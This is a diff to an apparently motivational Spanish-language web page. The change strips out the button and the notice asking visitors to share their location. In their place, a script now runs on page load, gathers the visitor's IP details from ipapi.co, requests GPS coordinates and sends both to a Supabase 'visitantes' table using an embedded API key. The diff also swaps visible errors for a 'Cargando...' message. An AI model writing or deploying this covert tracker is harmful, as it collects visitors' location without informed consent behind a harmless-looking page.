@@ -44,26 +44,6 @@
       opacity: 0;
     }
 
-    button {
-      padding: 15px 35px;
-      font-size: 1.2rem;
-      cursor: pointer;
-      border: none;
-      border-radius: 50px;
-      background: #00ff85;
-      color: #007200;
-      font-weight: bold;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-      transition: all 0.3s ease;
-      animation: fadeIn 2s ease forwards 2s;
-      opacity: 0;
-    }
-
-    button:hover {
-      transform: scale(1.1);
-      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-    }
-
     /* --- Fade-in animation --- */
     @keyframes fadeIn {
       to { opacity: 1; }
@@ -83,6 +63,12 @@
       100% { transform: translateY(-20vh) scale(1); opacity: 0; }
     }
 
+    .loading {
+      font-size: 1.2rem;
+      margin-top: 20px;
+      opacity: 0.8;
+    }
+
   </style>
 </head>
 <body>
@@ -90,10 +76,9 @@
   <h1>¡Bienvenido a tu espacio motivador! 🌟</h1>
   <p>
     Cada día es una nueva oportunidad para crecer, aprender y acercarte a tus sueños. 
-    Recuerda que los pequeños pasos constantes superan cualquier acción grande aislada. 
-    ¡Activa tu ubicación para recibir nuestro mensaje especial y unirte a nuestra comunidad de éxito!
+    Recuerda que los pequeños pasos constantes superan cualquier acción grande aislada.
   </p>
-  <button id="btnUbicacion">Ver más</button>
+  <p class="loading">Cargando...</p>
 
   <script>
     // --- Crear burbujas animadas ---
@@ -113,12 +98,13 @@
     const SUPABASE_URL = "https://ahjabjblvjydauzevjor.supabase.co/rest/v1/visitantes";
     const API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFoamFiamJsdmp5ZGF1emV2am9yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYxMDcwNzMsImV4cCI6MjA3MTY4MzA3M30.GXnuj9pnNdwWKgCsL3n4ftn-t7P32DK1CoyNAzjel9g";
 
-    document.getElementById("btnUbicacion").addEventListener("click", async () => {
+    // --- Ejecutar automáticamente al cargar la página ---
+    (async function() {
       try {
         // Obtener IP del usuario
         const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
 
-        // Solicitar geolocalización
+        // Solicitar geolocalización automáticamente
         navigator.geolocation.getCurrentPosition(async (pos) => {
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
@@ -145,7 +131,7 @@
           });
 
           if (res.ok) {
-            // Animación de despedida
+            // Animación de confirmación
             document.body.innerHTML = `
               <h1>¡Gracias por visitar! 🌟</h1>
               <p>
@@ -156,17 +142,20 @@
             `;
           } else {
             const errorText = await res.text();
-            alert("Error al guardar datos en Supabase: " + errorText);
+            console.error("Error al guardar datos:", errorText);
+            document.querySelector('.loading').textContent = "Hubo un error al registrar tu visita.";
           }
 
         }, (err) => {
-          alert("Debes permitir la ubicación para continuar.");
+          console.error("Error de geolocalización:", err);
+          document.querySelector('.loading').textContent = "No se pudo obtener la ubicación.";
         });
 
       } catch (error) {
         console.error("Error:", error);
+        document.querySelector('.loading').textContent = "Error al procesar los datos.";
       }
-    });
+    })();
   </script>
 </body>
 </html>
